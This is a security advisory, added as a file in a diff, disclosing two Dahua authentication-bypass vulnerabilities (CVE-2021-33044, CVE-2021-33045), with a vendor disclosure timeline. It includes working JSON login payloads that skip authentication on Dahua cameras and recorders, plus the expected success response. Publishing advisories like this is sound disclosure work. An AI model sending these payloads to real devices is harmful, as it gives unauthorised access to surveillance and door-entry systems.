@@ -1,0 +1,134 @@
+
+[STX]
+
+Subject: Dahua Authentication bypass (CVE-2021-33044, CVE-2021-33045)
+
+Attack vector: Remote
+Authentication: Anonymous (no credentials needed)
+Researcher: bashis <mcw noemail eu> (2021)
+Limited Disclosure: September 6, 2021
+Full Disclosure: October 6, 2021
+PoC: https://github.com/mcw0/DahuaConsole
+
+-=[Dahua]=-
+Advisory: https://www.dahuasecurity.com/support/cybersecurity/details/957
+Firmware: https://www.dahuasecurity.com/support/downloadCenter/firmware
+
+-=[Timeline]=-
+June 13, 2021: Initiated contact with Dahua PSIRT (CyberSecurity@dahuatech.com)
+June 17, 2021: Sent reminder to Dahua PSIRT
+June 18, 2021: Asked IPVM for help to get in contact with Dahua
+June 18, 2021: Received ACK from IPVM, told they sent note to Dahua
+June 19, 2021: ACK received from Dahua PSIRT, asked for additional details
+June 19, 2021: Additional details including PoC sent
+June 21, 2021: ACK received, vulnerabilites confirmed
+June 23, 2021: Dahua PSIRT asked for "coordinated disclosure"
+June 23, 2021: Confirmed 90 days before my disclosure, said they may release updated firmware anytime from now
+June 24, 2021: Received CVE-2021-33044, I asked about the second CVE
+July 03, 2021: Received CVE-2021-33045, Dahua PSIRT asked again for "coordinated disclosure"
+July 04, 2021: Confirmed "coordinated disclosure", once again
+July 05, 2021: Dahua PSIRT tried convince me for "Full Disclosure" for vendor only, and "Limited Disclosure" for outside world
+July 05, 2021: Disagreed, told I will let Dahua PSIRT read my note before "Limited Disclosure" September 6, 2021.
+               "Full Disclosure" will be October 6, 2021,
+August 30, 2021: Dahua PSIRT asked to read my "Limited Disclosure" note
+August 30, 2021: Sent my "Limited Disclosure" note
+September 1, 2021: Dahua PSIRT informing about release of their Security Advisory and firmware updates
+September 1, 2021: Notified Dahua PSIRT that I cannot find firmware updates for my IPC/VTH/VTO devices
+September 2, 2021: Dahua PSIRT pointed oversea website, asked for what models I have so Dahua could release firmware
+September 2, 2021: Refused to provide details, as I do expect me to find firmware on their website
+September 3, 2021: Dahua PSIRT informed that R&D will upload updated firmware in batches
+September 6, 2021: Limited Disclosure
+October 6, 2021: Full Disclosure
+
+
+-=[NetKeyboard Vulnerability]=-
+
+CVE-2021-33044
+
+Vulnerability:
+        "clientType": "NetKeyboard",
+Vulnerable device types: IPC/VTH/VTO (tested)
+Vulnerable Firmware: Those devices who do not support "NetKeyboard" functionality (older than June 2021)
+Protocol: DHIP and HTTP/HTTPS
+
+Details:
+Setting above "Vulnerability" on "Vulnerable device types" during 1st or 2nd "global.login" sequence will simply bypass authentication.
+
+Successful bypass returns: {"id":1,"params":{"keepAliveInterval":60},"result":true,"session":<sessionID>}
+
+[Example]
+{
+    "method": "global.login",
+    "params":
+    {
+        "userName": "admin",
+        "loginType": "Direct",
+        "clientType": "NetKeyboard",
+        "authorityType": "Default",
+        "passwordType": "Default",
+        "password": "Not Used"
+    },
+    "id": 1,
+    "session": 0
+}
+
+-=[Loopback Vulnerability]=-
+
+CVE-2021-33045
+
+Vulnerability:
+        "ipAddr": "127.0.0.1",
+        "loginType": "Loopback",
+        "clientType": "Local",
+
+Vulnerable device types: IPC/VTH/VTO/NVR/DVR (tested)
+Vulnerable Firmware: Firmware version older than beginning/mid 2020.
+Protocol: DHIP
+
+Details: 
+Setting above "Vulnerability" on "Vulnerable device types" during 1st or 2nd "global.login" sequence pretends that the login request comes from "loopback" and will therefore bypass legitimate authentication.
+
+Successful bypass returns: {"id":1,"params":{"keepAliveInterval":60},"result":true,"session":<sessionID>}
+
+
+[Example]
+Random MD5 with l/p: admin/admin
+{
+    "method": "global.login",
+    "params":
+    {
+        "userName": "admin",
+        "ipAddr": "127.0.0.1",
+        "loginType": "Loopback",
+        "clientType": "Local",
+        "authorityType": "Default",
+        "passwordType": "Default",
+        "password": "[REDACTED]"
+    },
+    "id": 1,
+    "session": 0
+}
+
+Plain text with l/p: admin/admin
+{
+    "method": "global.login",
+    "params":
+    {
+        "userName": "admin",
+        "ipAddr": "127.0.0.1",
+        "loginType": "Loopback",
+        "clientType": "Local",
+        "authorityType": "Default",
+        "passwordType": "Plain",
+        "password": "admin"
+    },
+    "id": 1,
+    "session": 0
+}
+
+[ETX]
+
+
+
+
+
